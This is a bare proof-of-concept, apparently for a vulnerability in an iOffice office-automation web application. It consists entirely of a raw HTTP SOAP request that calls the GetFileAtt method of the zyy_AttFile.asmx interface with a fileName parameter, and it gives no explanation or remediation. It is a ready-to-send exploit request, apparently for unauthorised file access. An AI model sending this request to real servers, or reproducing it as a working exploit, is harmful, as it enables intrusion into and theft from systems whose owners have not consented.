POC

```
POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
Host: 10.250.250.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 383
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/GetFileAtt"
Accept-Encoding: gzip, deflate
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></so
ap:Envelope>
```

